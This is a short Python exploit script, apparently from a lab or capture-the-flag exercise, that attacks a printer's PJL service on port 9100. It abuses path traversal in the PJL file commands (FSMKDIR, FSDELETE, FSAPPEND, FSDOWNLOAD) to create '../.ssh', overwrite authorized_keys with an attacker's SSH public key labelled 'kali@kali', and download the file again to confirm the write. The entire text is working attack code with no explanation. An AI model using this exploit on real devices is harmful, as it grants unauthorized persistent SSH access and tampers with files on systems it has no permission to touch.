#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)


def phase_upload() -> None:
    s = socket.socket()
    s.settimeout(8)
    s.connect(("127.0.0.1", 9100))
    hdr = f'@PJL FSAPPEND NAME="{PATH}" SIZE={N}\r\n'.encode()
    s.sendall(hdr)
    r1 = s.recv(256)
    print("hdr_resp", repr(r1))
    s.sendall(KEY)
    try:
        r2 = s.recv(256)
    except socket.timeout:
        r2 = b"T2"
    print("body_resp", repr(r2))
    s.close()


def phase_upload2() -> None:
    """Header only SIZE line separate (like broken FSUPLOAD)."""
    s = socket.socket()
    s.settimeout(8)
    s.connect(("127.0.0.1", 9100))
    s.sendall(f'@PJL FSAPPEND NAME="{PATH}"\r\n'.encode())
    r1 = s.recv(256)
    print("name_resp", repr(r1))
    s.sendall(f"SIZE={N}\r\n".encode())
    r2 = s.recv(256)
    print("size_resp", repr(r2))
    s.sendall(KEY)
    try:
        r3 = s.recv(256)
    except socket.timeout:
        r3 = b"T3"
    print("body_resp2", repr(r3))
    s.close()


def query_dl() -> None:
    s = socket.socket()
    s.settimeout(5)
    s.connect(("127.0.0.1", 9100))
    s.sendall(b'@PJL FSQUERY NAME="../.ssh"\r\n')
    print("Q", s.recv(1024))
    s.close()
    s = socket.socket()
    s.settimeout(8)
    s.connect(("127.0.0.1", 9100))
    s.sendall(f'@PJL FSDOWNLOAD NAME="{PATH}" SIZE={N}\r\n'.encode())
    s.shutdown(socket.SHUT_WR)
    dl = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            dl += c
    except socket.timeout:
        pass
    print("DL", len(dl), dl[:120])
    s.close()


s = socket.socket()
s.settimeout(3)
s.connect(("127.0.0.1", 9100))
s.sendall(b'@PJL FSMKDIR NAME="../.ssh"\r\n')
s.recv(256)
s.close()
s = socket.socket()
s.settimeout(3)
s.connect(("127.0.0.1", 9100))
s.sendall(f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode())
try:
    print("del", s.recv(256))
except socket.timeout:
    pass
s.close()

phase_upload()
query_dl()
phase_upload2()
query_dl()